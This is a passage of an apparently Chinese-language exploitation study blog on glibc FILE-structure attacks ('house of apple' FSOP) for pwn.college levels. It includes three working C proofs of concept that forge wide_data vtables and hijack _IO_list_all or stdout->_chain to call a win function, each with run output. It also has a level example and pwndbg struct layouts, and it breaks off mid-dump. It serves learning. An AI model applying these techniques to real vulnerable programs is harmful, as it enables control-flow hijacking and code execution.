<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) </span><br><span class="line">|| </span><br><span class="line">(</span><br><span class="line">    _IO_vtable_offset(fp) == <span class="number">0</span> </span><br><span class="line">    &amp;&amp;</span><br><span class="line">    fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">    &amp;&amp; </span><br><span class="line">    (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>翻译成人话就是下面两条<strong>有一条为真</strong>即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.如果fp-&gt;_mode&lt;=0,还需要满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">2.如果fp-&gt;_mode&gt; 0,还需要满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>
<p>如果能够使用<code>house of apple</code>的方法,</p>
<p><strong>使得的<code>vtable</code>指向<code>_IO_wfile_jumps</code>,然后构造<code>wide_data</code>,并使其<code>wide_vtable</code>指向假的虚表,假表相应位置填充<code>win</code>函数地址</strong></p>
<p><strong>然后将这个FILE挂到<code>_IO_list_all</code>链上</strong></p>
<p>就可以调用到<code>win</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + <span class="number">0x18</span> =&gt; _IO_wfile_overflow</span><br><span class="line">						_IO_wdoallocbuf</span><br><span class="line">							_IO_WDOALLOCATE</span><br><span class="line">    							wide_data.wide_vtable  + <span class="number">0x68</span> =&gt; win</span><br></pre></td></tr></table></figure>
<p>写一个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fake_fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    <span class="comment">//泄露libc基址,泄露IO_wfile_jumps地址,泄露IO_list_all地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_list_all_addr = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d74c0</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_list_all_addr = %p\n&quot;</span>, IO_list_all_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    <span class="comment">//构造fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.</span></span><br><span class="line">    <span class="comment">//构造fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.</span></span><br><span class="line">    <span class="comment">//构造fake_fp</span></span><br><span class="line">    fake_fp = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_fp,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">    fake_fp -&gt; _flags =  ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>); </span><br><span class="line">    fake_fp -&gt; _mode = <span class="number">0</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_fp @ %p\n&quot;</span>, fake_fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;orignal _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//5.fake_fp上链_IO_list_all</span></span><br><span class="line">    *IO_list_all_addr = fake_fp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.</span></span><br><span class="line">    <span class="comment">//return and trigger win</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc fsop1.c -o fsop1 -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./fsop1</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7fb0bbddc110</span><br><span class="line">libc_addr = 0x7fb0bbd88000</span><br><span class="line">IO_list_all_addr = 0x7fb0bbf5f4c0</span><br><span class="line">IO_wfile_jumps = 0x7fb0bbf5d268</span><br><span class="line">fake_fp @ 0x55fbae0cc8d0</span><br><span class="line">orignal _IO_list_all points to 0x7fb0bbf5f4e0</span><br><span class="line">new _IO_list_all points to 0x55fbae0cc8d0</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>
<p>如果能够控制<code>fopen</code>并且不<code>fclose</code>关闭资源则更简单,</p>
<p><code>fopen</code>会自动让假<code>fp</code>上链,</p>
<p>不<code>fclose</code>的话<code>fp</code>就不会下链,</p>
<p>因此此时程序退出,也可以触发</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.泄露libc基地址,泄露IO_wfile_jumps地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.构造fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.fopen打开的FILE对象,会自动挂到IO_list_all上,省去了我们泄露IO_list_all并修改其值的步骤</span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>);</span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//修改vtable和wide_data.wide_vtable</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//fclose(fp);   如果fclose执行则fp会从IO_list_all中删除,因此不能执行</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.return and trigger win</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc fsop.c -o fsop -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./fsop</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7f218fb94110</span><br><span class="line">libc_addr = 0x7f218fb40000</span><br><span class="line">IO_wfile_jumps = 0x7f218fd15268</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>
<p>也可以通过修改<code>stdout-&gt;_chain</code>指向假<code>FILE</code>实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end =<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.通过沾stdout亲带故上链</span></span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_chain = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="pwn.college"><a
target="_blank" rel="noopener" href="https://pwn.college/software-exploitation/file-struct-exploits/">pwn.college</a></h2>
<h3 id="level1">level1</h3>
<p>篡改位于堆上的<code>FILE</code>结构,使其文件描述符<code>fileno</code>为1,也就是到标准输出</p>
<p>使其缓冲区位于泄露地址上</p>
<p>举一个例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> flag[]=<span class="string">&quot;flag&#123;secret&#125;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,flag);			<span class="comment">//泄露flag地址</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,fp,<span class="number">480</span>);</span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">0x100</span>,fp);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="level7">level7</h3>
<p><code>level7</code>题目中给的提示是这样的:</p>
<blockquote>
<p>This can be done by creating a fake _wide_data struct which will not
have a security check on the vtable.</p>
</blockquote>
<p>意思是篡改<code>_wide_data.vtable</code>指针不会被检查</p>
<p>在一个<code>FILE</code>结构体中,理论上有两个<code>vtable</code>指针,一个<code>_IO_FILE_plus + 0xd8</code>处的<code>vtable</code>指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x00d8 */</span>    FILE file;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  224 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>还有一个在<code>_IO_FILE._wide_data._wide_vtable</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE + 0xa0    =&gt;  _wide_data</span><br><span class="line">_wide_data + 0xe0  =&gt;  _wide_vtable</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line"><span class="comment">/* 0x0068      |  